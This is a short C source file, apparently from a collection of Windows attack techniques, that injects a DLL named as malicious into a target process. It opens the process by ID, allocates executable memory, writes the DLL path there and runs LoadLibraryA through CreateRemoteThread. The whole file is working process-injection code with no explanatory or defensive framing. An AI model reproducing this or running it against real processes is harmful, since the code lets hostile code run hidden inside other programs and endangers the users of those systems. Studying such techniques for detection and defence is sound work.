#include "../helpers.h"

char maliciousDLL[] = "C:\\injection_dll.dll";
unsigned int dll_length = sizeof(maliciousDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE process_handle;
  HANDLE remote_thread;
  PVOID remote_buffer;

  HMODULE kernel32_handle = GetModuleHandle("kernel32.dll");
  VOID *lbuffer = GetProcAddress(kernel32_handle, "LoadLibraryA");

  if (atoi(argv[1]) == 0) {
    printf("Target Process ID not found. Abort.\n");
    return -1;
  }

  printf("Target Process ID: %i", atoi(argv[1]));
  process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
  remote_buffer = VirtualAllocEx(process_handle, NULL, dll_length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(process_handle, remote_buffer, maliciousDLL, dll_length, NULL);
  remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lbuffer, remote_buffer, 0, NULL);
  CloseHandle(process_handle);

  return 0;
}